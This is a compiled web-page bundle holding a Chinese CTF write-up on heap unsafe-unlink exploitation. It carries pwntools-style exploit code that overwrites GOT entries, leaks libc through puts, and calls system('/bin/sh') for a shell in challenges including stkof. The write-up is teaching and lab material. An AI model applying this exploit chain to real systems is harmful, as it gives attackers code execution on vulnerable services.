`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"atoi_got"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}},"	"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#0号块")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"atoi_got"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}},"	"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#1号块")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"free_got"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}},"	"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#2号块")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"9"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#F78C6C"}},"6"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#填充")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"edit"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"60"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}},"py"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),_l=s("p",null,[s("img",{src:I,alt:"upload successful"})],-1),dl=s("p",null,"这一步会让堆块指向我们填入的地址。再次edit堆块的时候，其实edit的是填入地址的值。",-1),ul=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"edit"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"2"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"10"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"puts_plt"),s("span",{style:{color:"#89DDFF"}},"))"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#将原来的free改成puts_plt")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"free"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#其实就是输出0号块")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"rc"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"1"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"addr "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"u64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"rc"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"6"),s("span",{style:{color:"#89DDFF"}},")."),s("span",{style:{color:"#82AAFF"}},"ljust"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#A6ACCD"}},"\\x00"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},"))-"),s("span",{style:{color:"#A6ACCD"}},"libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"sym"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"atoi"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#减掉偏移")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"print"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"addr--->"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#82AAFF"}},"hex"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"addr"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#输出的是基地址")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"system "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," addr "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"sym"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"system"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#system的地址")])])])],-1),hl=s("p",null,"地址如下：",-1),ml=s("p",null,[s("img",{src:N,alt:"upload successful"})],-1),gl=s("p",null,[l("接下来将1号块改为"),s("code",null,"system"),l("的地址"),s("code",null,"edit(1,0x10,p64(system))")],-1),fl=s("p",null,[s("img",{src:V,alt:"upload successful"})],-1),kl=s("p",null,"再次调用atoi函数的时候，就会跳转到system。",-1),xl=s("p",null,[s("img",{src:X,alt:"upload successful"})],-1),bl=s("p",null,"ida中查看发现，每次最开始输入完菜单之后，都会运行一次atoi，所以再次直接输入参数/bin/sh即可getshell",-1),El=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"ru"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"Your choice: "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"sl"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"/bin/sh"),s("span",{style:{color:"#A6ACCD"}},"\\x00"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),vl=s("p",null,"例题3: stkof",-1),Pl=s("p",null,"程序运行时没有提示",-1),Bl=s("p",null,[s("img",{src:j,alt:"upload successful"})],-1),Kl=s("p",null,"首选构造的fake_chunk如下",-1),wl=s("p",null,[s("img",{src:L,alt:"upload successful"})],-1),$l=s("p",null,"覆盖下一个堆块的size头后，如下",-1),zl=s("p",null,[s("img",{src:S,alt:"upload successful"})],-1),Tl=s("p",null,"free之后，2号和3号合并。再edit 2号块，实际上就是在edit ptr - 0x18的位置处的值。",-1),Il=s("p",null,[s("code",null,"edit(2,0x10,'AAA')")],-1),Nl=s("p",null,[s("img",{src:J,alt:"upload successful"})],-1),Vl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py1 "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"''")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py1 "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"atoi_got"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"puts_got"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"free_got"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"edit"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"2"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}},"len"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"py1"),s("span",{style:{color:"#89DDFF"}},"),"),s("span",{style:{color:"#82AAFF"}},"py1"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),Xl=s("p",null,[s("img",{src:O,alt:"upload successful"})],-1),jl=s("p",null,"此时0x602150处的值是0x602018，再次edit 2号块，实际上edit的是0x602018处的值。原本是free函数，就会把其改成相应的值。",-1),Ll=s("p",null,[s("img",{src:U,alt:"upload successful"})],-1),Sl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py2 "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"''")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"py2 "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"puts_plt"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"edit"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"2"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}},"len"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"py2"),s("span",{style:{color:"#89DDFF"}},"),"),s("span",{style:{color:"#82AAFF"}},"py2"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),Jl=s("p",null,"这样就把free函数改成了puts_plt。",-1),Ol=s("p",null,[s("img",{src:Z,alt:"upload successful"})],-1),Ul=s("p",null,[l("free所在的堆块号为2，前面的puts_got为堆块1。用puts_plt泄漏出pus_got的地址 "),s("code",null,"puts_addr--->0x7ffff7a7c6a0")],-1),Zl=s("p",null,"然后就可以找到system的地址。",-1),Ml=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"system "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," puts_addr "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}}," libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"symbols"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"puts"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"symbols"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"system"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},"]")])])])],-1),Yl=s("p",null,"刚才覆盖的atoi的堆块为0号，将其改为system",-1),ql=s("p",null,[s("img",{src:M,alt:"upload successful"})],-1),Gl=s("p",null,"直接传入参数/bin/sh即可。",-1),Hl=s("p",null,[s("img",{src:Y,alt:"upload successful"})],-1);function Ql(t,Rl,Wl,so,p,lo){const e=C,r=D;return A(),i(r,{frontmatter:p.frontmatter,data:p.data},{"main-content-md":o(()=>[s("h3",G,[l("基础知识 "),a(e,{class:"header-anchor",href:"#基础知识","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),H,Q,R,W,ss,ls,os,ts,ns,es,as,cs,ps,s("p",null,[l("参考示例代码 "),a(e,{href:"https://github.com/Escapingbug/how2heap/blob/master/unsafe_unlink.c",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://github.com/Escapingbug/how2heap/blob/master/unsafe_unlink.c")]),_:1})]),rs,Ds,Fs,ys,is,As,Cs,_s,ds,us,hs,ms,gs,fs,ks,xs,bs,Es,vs,Ps,Bs,s("h3",Ks,[l("例题 "),a(e,{class:"header-anchor",href:"#例题","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),ws,$s,zs,Ts,Is,Ns,Vs,Xs,js,Ls,Ss,Js,Os,Us,Zs,Ms,Ys,qs,Gs,Hs,Qs,Rs,Ws,sl,ll,ol,tl,nl,el,al,cl,pl,rl,Dl,Fl,yl,il,Al,Cl,_l,dl,ul,hl,ml,gl,fl,kl,xl,bl,El,vl,Pl,Bl,Kl,wl,$l,zl,Tl,Il,Nl,Vl,Xl,jl,Ll,Sl,Jl,Ol,Ul,Zl,Ml,Yl,ql,Gl,Hl,s("p",null,[l("本题可参考如下文章 "),a(e,{href:"https://wzt.ac.cn/2018/10/16/s-pwn-project-4/",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://wzt.ac.cn/2018/10/16/s-pwn-project-4/")]),_:1})])]),"main-header":o(()=>[n(t.$slots,"main-header")]),"main-header-after":o(()=>[n(t.$slots,"main-header-after")]),"main-nav":o(()=>[n(t.$slots,"main-nav")]),"main-content":o(()=>[n(t.$slots,"main-content")]),"main-content-after":o(()=>[n(t.$slots,"main-content-after")]),"main-nav-before":o(()=>[n(t.$slots,"main-nav-before")]),"main-nav-after":o(()=>[n(t.$slots,"main-nav-after")]),comment:o(()=>[n(t.$slots,"comment")]),footer:o(()=>[n(t.$slots,"footer")]),aside:o(()=>[n(t.$slots,"aside")]),"aside-custom":o(()=>[n(t.$slots,"aside-custom")]),default:o(()=>[n(t.$slots,"default")]),_:3},8,["frontmatter","data"])}const po=F(q,[["render",Ql]]);export{co as __pageData,po as default};
